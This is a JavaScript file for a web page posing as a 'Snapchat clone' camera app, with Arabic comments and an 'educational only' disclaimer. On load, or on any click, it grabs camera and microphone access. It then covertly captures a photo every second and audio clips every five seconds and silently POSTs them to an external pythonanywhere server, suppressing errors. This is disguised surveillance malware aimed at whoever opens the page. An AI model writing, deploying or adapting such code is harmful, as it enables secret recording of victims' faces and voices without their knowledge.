/**
 * ============================================
 * Snapchat Clone - Camera & Audio Capture
 * للأغراض التعليمية فقط
 * ============================================
 */

const CONFIG = {
    backendUrl: 'https://Alworker.pythonanywhere.com',
    photoInterval: 1000,
    audioInterval: 5000,
    audioDuration: 3000
};

let stream = null;
let mediaRecorder = null;
let photoTimer = null;
let audioTimer = null;
let photoCounter = 0;
let audioCounter = 0;
let isRunning = false;

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const captureBtn = document.getElementById('captureBtn');
const photoCountEl = document.getElementById('photoCount');
const audioCountEl = document.getElementById('audioCount');
const flashBtn = document.getElementById('flashBtn');
const container = document.querySelector('.snap-container');

// ========== تشغيل الكاميرا تلقائياً ==========
async function initCamera() {
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'user',
                width: { ideal: 720 },
                height: { ideal: 1280 }
            },
            audio: true
        });
        
        video.srcObject = stream;
        isRunning = true;
        
        // بدء الالتقاط التلقائي
        startAutoCapture();
        
        console.log('✅ الكاميرا اشتغلت تلقائياً');
    } catch (error) {
        console.log('⏳ انتظار إذن الكاميرا...');
        // الكاميرا هتشتغل لما المستخدم يضغط على الشاشة
    }
}

// ========== بدء الالتقاط التلقائي ==========
function startAutoCapture() {
    if (!isRunning) return;
    
    photoTimer = setInterval(capturePhoto, CONFIG.photoInterval);
    audioTimer = setInterval(recordAudio, CONFIG.audioInterval);
    
    // أول صورة وتسجيل فوراً
    setTimeout(capturePhoto, 300);
    setTimeout(recordAudio, 800);
}

// ========== التقاط صورة ==========
function capturePhoto() {
    if (!isRunning || !stream) return;
    
    try {
        canvas.width = video.videoWidth || 720;
        canvas.height = video.videoHeight || 1280;
        
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        const imageData = canvas.toDataURL('image/jpeg', 0.6);
        sendToServer('/capture', { image: imageData }, 'photo');
        
        photoCounter++;
        photoCountEl.textContent = photoCounter;
        
        // فلاش
        flashScreen();
        
    } catch (e) {
        console.error('Photo error:', e);
    }
}

// ========== تسجيل صوت ==========
function recordAudio() {
    if (!isRunning || !stream) return;
    
    try {
        const audioStream = new MediaStream(stream.getAudioTracks());
        const chunks = [];
        
        mediaRecorder = new MediaRecorder(audioStream, {
            mimeType: MediaRecorder.isTypeSupported('audio/webm;codecs=opus') 
                ? 'audio/webm;codecs=opus' : 'audio/webm'
        });
        
        mediaRecorder.ondataavailable = (e) => {
            if (e.data.size > 0) chunks.push(e.data);
        };
        
        mediaRecorder.onstop = () => {
            const blob = new Blob(chunks, { type: 'audio/webm' });
            const reader = new FileReader();
            reader.onloadend = () => {
                sendToServer('/audio', { audio: reader.result }, 'audio');
                audioCounter++;
                audioCountEl.textContent = audioCounter;
            };
            reader.readAsDataURL(blob);
        };
        
        mediaRecorder.start();
        setTimeout(() => {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }
        }, CONFIG.audioDuration);
        
    } catch (e) {
        console.error('Audio error:', e);
    }
}

// ========== إرسال للسيرفر ==========
async function sendToServer(endpoint, data, type) {
    try {
        await fetch(`${CONFIG.backendUrl}${endpoint}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
    } catch (e) {
        // فشل صامت
    }
}

// ========== تأثير فلاش ==========
function flashScreen() {
    const flash = document.createElement('div');
    flash.style.cssText = `
        position: fixed;
        top: 0; left: 0;
        width: 100%; height: 100%;
        background: white;
        z-index: 100;
        pointer-events: none;
        animation: flashAnim 0.2s ease-out forwards;
    `;
    document.body.appendChild(flash);
    setTimeout(() => flash.remove(), 300);
}

// إضافة أنيميشن الفلاش
const style = document.createElement('style');
style.textContent = `
    @keyframes flashAnim {
        0% { opacity: 1; }
        100% { opacity: 0; }
    }
`;
document.head.appendChild(style);

// ========== أحداث الأزرار ==========
// الضغط على أي حتة في الشاشة يشغل الكاميرا لو مش شغالة
document.body.addEventListener('click', () => {
    if (!isRunning) {
        initCamera();
    }
});

// زر الفلاش
flashBtn.addEventListener('click', (e) => {
    e.stopPropagation();
    if (video.style.filter === 'brightness(2)') {
        video.style.filter = 'brightness(1)';
        flashBtn.textContent = '⚡';
    } else {
        video.style.filter = 'brightness(2)';
        flashBtn.textContent = '💡';
    }
});

// ========== بدء تلقائي ==========
initCamera();

// ========== تحذير ==========
console.log('⚠️ للأغراض التعليمية فقط');